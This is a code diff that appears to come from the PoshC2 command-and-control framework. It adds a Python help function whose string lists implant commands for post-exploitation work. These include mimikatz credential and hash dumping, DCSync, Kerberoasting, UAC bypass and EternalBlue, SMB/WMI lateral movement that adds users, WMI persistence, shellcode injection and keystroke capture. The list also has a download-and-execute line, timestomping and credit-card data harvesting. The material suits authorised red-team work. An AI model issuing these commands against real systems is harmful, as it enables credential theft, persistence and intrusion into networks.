@@ -1550,6 +1550,285 @@ def do_help(user, command, implant_id):
 
 
 @command(commands, commands_help, examples, block_help)
+def do_helpold(user, command, implant_id):
+    """
+    Displays a list of all the available commands for this implant, or
+    help for a particular command if specified.
+
+    MITRE TTPs:
+        {}
+
+    Examples:
+        help
+        help list-modules
+        help inject-shellcode
+    """
+
+    posh_help = """
+* Implant Features:
+=====================
+ps
+invoke-urlcheck -urls https://api.hsbc.com,https://d36xb1r83janbu.cloudfront.net -domainfront d2argm04ypulrn.cloudfront.net,d36xb1r83janbu.cloudfront.net -uri /en-gb/surface/accessories/
+searchhelp mimikatz
+searchallhelp mimikatz
+searchhistory invoke-mimikatz
+label-implant <newlabel>
+remove-label
+get-hash
+enable-rotation
+get-rotation
+unhidefile
+hidefile
+get-ipconfig
+netstat
+beacon 60s / beacon 10m / beacon 2h
+turtle 60s / turtle 30m / turtle 8h
+kill-process
+kill-implant
+hide-implant
+unhide-implant
+loadpowerstatus
+get-proxy
+get-computerinfo
+unzip <source file> <destination folder>
+get-system
+get-implantworkingdirectory
+get-pid
+posh-delete c:\\temp\\svc.exe
+get-webpage http://intranet
+listmodules
+modulesloaded
+loadmodule <modulename>
+loadmodule inveigh.ps1
+loadmoduleforce inveigh.ps1
+get-userinfo
+invoke-hostenum -all
+find-allvulns
+invoke-expression (get-webclient).downloadstring("https://module.ps1")
+startanotherimplant or sai
+startdaisy
+invoke-daisychain -daisyserver http://192.168.1.1 -port 8899 -c2port 443 -c2server https://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\\test -proxypassword pass -localhost (optional if low level user)
+createproxypayload -user <dom\\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>
+get-mshotfixes
+get-firewallrulesall | out-string -width 200
+enablerdp
+disablerdp
+netsh.exe advfirewall firewall add rule name="enablerdp" dir=in action=allow protocol=tcp localport=any enable=yes
+get-wlanpass
+get-wmiobject -class win32_product
+get-creditcarddata -path 'c:\\backup\\'
+timestomp c:\\windows\\system32\\service.exe "01/03/2008 12:12 pm"
+icacls c:\\windows\\system32\\resetpassword.exe /grant administrator:f
+create-shortcut -sourceexe "c:\\windows\\notepad.exe" -argumentstosourceexe "" -destinationpath "c:\\users\\public\\notepad.lnk"
+get-allfirewallrules c:\\temp\\rules.csv
+get-allservices
+get-wmireglastloggedon
+get-wmiregcachedrdpconnection
+get-wmiregmounteddrive
+resolve-ipaddress
+get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`nAMSI Loaded`n"} }
+get-wmiObject -class win32_product
+
+* Privilege Escalation:
+====================
+invoke-allchecks
+Invoke-PsUACme -Payload "c:\\temp\\uac.exe" -method sysprep
+get-mshotfixes | where-object {$_.hotfixid -eq "kb2852386"}
+invoke-ms16-032
+invoke-ms16-032-proxypayload
+invoke-eternalblue -target 127.0.0.1  -initialgrooms 5 -maxattempts 1 -msfbind
+get-gpppassword
+get-content 'c:\\programdata\\mcafee\\common framework\\sitelist.xml'
+dir -recurse | select-string -pattern 'password='
+
+* File Management:
+=================
+download-file -source 'c:\\temp dir\\run.exe'
+download-files -directory 'c:\\temp dir\\'
+upload-file -source 'c:\\temp\\run.exe' -destination 'c:\\temp\\test.exe'
+web-upload-file -from 'http://www.example.com/app.exe' -to 'c:\\temp\\app.exe'
+
+* Persistence (with powershell.exe):
+====================================
+install-persistence 1,2,3
+remove-persistence 1,2,3
+install-servicelevel-persistence
+remove-servicelevel-persistence
+invoke-wmievent -name backup -command "powershell -enc abc" -hour 10 -minute 30
+get-wmievent
+remove-wmievent -name backup
+
+* Persistence:
+=============
+installexe-persistence
+removeexe-persistence
+
+* Network Tasks / Lateral Movement:
+==================================
+get-externalip
+test-adcredential -domain test -user ben -password password1
+invoke-smblogin -target 192.168.100.20 -domain testdomain -username test -hash/-password
+invoke-smbclient -Action Put -source c:\\temp\\test.doc -destination \\test.com\\c$\\temp\\test.doc -hash
+invoke-smbexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
+invoke-wmiexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
+net view | net users | net localgroup administrators | net accounts /dom
+whoami /groups | whoami /priv
+
+* Active Directory Enumeration:
+==================
+invoke-aclscanner
+invoke-aclscanner | Where-Object {$_.IdentityReference -eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
+get-objectacl -resolveguids -samaccountname john
+add-objectacl -targetsamaccountname arobbins -principalsamaccountname harmj0y -rights resetpassword
+get-netuser -admincount | select samaccountname
+get-netuser -uacfilter not_accountdisable -properties samaccountname,pwdlastset
+get-domainuser -uacfilter not_password_expired,not_accountdisable -properties samaccountname,pwdlastset | export-csv act.csv
+get-netgroup -admincount | select samaccountname
+get-netgroupmember "domain admins" -recurse|select membername
+get-netcomputer | select-string -pattern "citrix"
+get-netcomputer -filter operatingsystem=*7*|select name
+get-netcomputer -filter operatingsystem=*2008*|select name
+get-netcomputer -searchbase "LDAP://OU=Windows 2008 Servers,OU=ALL Servers,DC=poshc2,DC=co,DC=uk"|select name
+get-netcomputer -domaincontroller internal.domain.com -domain internal.domain.com -Filter "(lastlogontimestamp>=$((Get-Date).AddDays(-30).ToFileTime()))(samaccountname=UK*)"|select name,lastlogontimestamp,operatingsystem
+get-domaincomputer -ldapfilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -spn "wsman*" -properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl
+get-netgroup | select-string -pattern "internet"
+get-netuser | select-object samaccountname,userprincipalname
+get-netuser -filter samaccountname=test
+get-netuser -filter userprinciplename=test@test.com
+get-netgroup | select samaccountname
+get-netgroup "*ben*" | select samaccountname
+get-netgroupmember "domain admins" -recurse|select membername
+get-netshare hostname
+invoke-sharefinder -verbose -checkshareaccess
+new-psdrive -name "p" -psprovider "filesystem" -root "\\\\bloredc1\\netlogon"
+
+* Domain Trusts:
+==================
+get-netdomain | get-netdomaincontroller | get-netforestdomain
+get-netforest | get-netforesttrust
+invoke-mapdomaintrust
+get-netuser -domain child.parent.com -filter samaccountname=test
+get-netgroup -domain child.parent.com | select samaccountname
+
+* Domain / Network Tasks:
+==================
+invoke-bloodhound -collectionmethod stealth
+get-netdomaincontroller | select name | get-netsession | select *username,*cname
+get-dfsshare | get-netsession | select *username,*cname
+get-netfileserver | get-netsession | select *username,*cname
+invoke-kerberoast -outputformat hashcat|select-object -expandproperty hash
+get-domaingpouserlocalgroupmapping -Identity MYSPNUSER -Domain internal.domain.com -server dc01.internal.domain.com |select ComputerName -expandproperty ComputerName | fl
+get-domaingpouserlocalgroupmapping -LocalGroup RDP -Identity MYSPNUSER -Domain internal.domain.com -server dc01.internal.domain.com |select ComputerName -expandproperty ComputerName | fl
+write-scffile -ipaddress 127.0.0.1 -location \\\\localhost\\c$\\temp\\
+write-inifile -ipaddress 127.0.0.1 -location \\\\localhost\\c$\\temp\\
+get-netgroup | select-string -pattern "internet"
+invoke-hostscan -iprangecidr 172.16.0.0/24 (provides list of hosts with 445 open)
+get-netfileserver -domain testdomain.com
+find-interestingfile -path \\\\server\\share -officedocs -lastaccesstime (get-date).adddays(-7)
+get-netlocalgroupmember -computername host1 -groupname administrators| select membername
+brute-ad
+brute-locadmin -username administrator
+get-passpol
+get-passnotexp
+get-locadm
+invoke-inveigh -http y -proxy y -nbns y -tool 1 -StartupChecks y
+get-inveigh
+stop-inveigh
+invoke-sniffer -outputfile c:\\temp\\output.txt -maxsize 50mb -localip 10.10.10.10
+invoke-sqlquery -sqlserver 10.0.0.1 -user sa -pass sa -query 'select @@version'
+invoke-runas -user <user> -password '<pass>' -domain <dom> -command c:\\windows\\system32\\cmd.exe -args " /c calc.exe"
+runas-netonly "domain" "username" "password" "ls \\\\mydc\\c$"
+invoke-pipekat -target <ip-optional> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
+invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -command <cmd>
+
+* Lateral Movement - powershell.exe:
+=========================================================
+invoke-runaspayload -user <user> -password '<pass>' -domain <dom> -credid <credid-optional>
+invoke-psexecpayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional> -credid <credid-optional>
+invoke-wmipayload -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -credid <credid-optional>
+invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass> -credid <credid-optional>
+invoke-dcompayload -target <ip>
+
+* Lateral Movement - shellcode:
+=========================================================
+invoke-wmijspayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -credid <credid-optional>
+
+* Credentials / Tokens / Local Hashes (Must be SYSTEM):
+=========================================================
+invoke-mimikatz -command '"sekurlsa::logonpasswords"'
+invoke-mimikatz -command '"privilege::debug" "lsadump::sam"'
+invoke-mimikatz -command '"privilege::debug" "lsadump::lsa"'
+invoke-mimikatz -command '"privilege::debug" "lsadump::cache"'
+invoke-mimikatz -command '"privilege::debug" "lsadump::secrets"'
+invoke-mimikatz -command '"ts::multirdp"'
+invoke-mimikatz -command '"privilege::debug"'
+invoke-mimikatz -command '"crypto::capi"'
+invoke-mimikatz -command '"crypto::certificates /export"'
+invoke-mimikatz -command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash> /run:c:\\temp\\run.bat"'
+invoke-tokenmanipulation | select-object domain, username, processid, iselevated, tokentype | ft -autosize | out-string
+invoke-tokenmanipulation -impersonateuser -username "domain\\user"
+get-lapspasswords
+
+* Credentials / Domain Controller Hashes:
+============================================
+invoke-mimikatz -command '"lsadump::dcsync /domain:domain.local /user:administrator"'
+invoke-dcsync -pwdumpformat
+dump-ntds -emptyfolder <emptyfolderpath>
+
+* Useful Modules:
+====================
+get-screenshot
+get-screenshotallwindows
+get-screenshotmulti -timedelay 120 -quantity 30
+get-recentfiles
+cred-popper
+get-clipboard
+hashdump
+get-keystrokes
+get-keystrokedata
+arpscan -ipcidr 10.0.0.1/24
+portscan -hosts 10.0.0.1-50 -ports "1-65535" -threads 10000 -delay 0
+get-netstat | %{"$($_.Protocol) $($_.LocalAddress):$($_.LocalPort) $($_.RemoteAddress):$($_.RemotePort) $($_.State) $($_.ProcessName)($($_.PID))"}
+migrate
+migrate -procid 4444
+migrate -procpath c:\\windows\\system32\\netsh.exe -RtlCreateUserThread
+migrate -procpath c:\\windows\\system32\\netsh.exe -notsuspended
+inject-shellcode -x86 -procid 5634 -parentId 1111
+inject-shellcode -x64 -procpath 'c:\\windows\\system32\\svchost.exe' -parentId 1111
+inject-shellcode -x64 -procpath 'c:\\windows\\system32\\netsh.exe' -parentId 1111 -notsuspended
+get-injectedthread
+get-eventlog -newest 10000 -instanceid 4624 -logname security | select message -expandproperty message | select-string -pattern "user1|user2|user3"
+send-mailmessage -to "itdept@test.com" -from "user01 <user01@example.com>" -subject <> -smtpserver <> -attachment <>
+sharpsocks -uri http://www.c2.com:9090 -beacon 2000 -insecure
+stopsocks
+netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow program="C:\\windows\\system32\\svchost.exe" protocol=TCP localport=80 profile=Domain
+reversedns 10.0.0.1
+invoke-edrchecker
+invoke-edrchecker -force
+invoke-edrchecker -remote <hostname>
+invoke-edrchecker -remote <hostname> -ignore
+
+* PS Commands:
+===============
+((new-object Net.Sockets.TcpClient).connect("10.0.0.1",445))
+1..254 | %{ try {[System.Net.Dns]::GetHostEntry("10.0.0.$_") } catch {} }|select hostname
+[System.Net.Dns]::GetHostbyAddress("10.0.0.1")
+$socket = new-object System.Net.Sockets.TcpListener('0.0.0.0', 1080);$socket.start();
+
+
+* Implant Handler:
+====================
+searchhelp payload
+searchallhelp mimikatz
+searchhistory pushover
+back
+quit
+exit
+"""
+
+    print_good(posh_help)
+
+@command(commands, commands_help, examples, block_help)
 def do_search_help(user, command, implant_id):
     """
     Search the command list for commands containing the keyword.
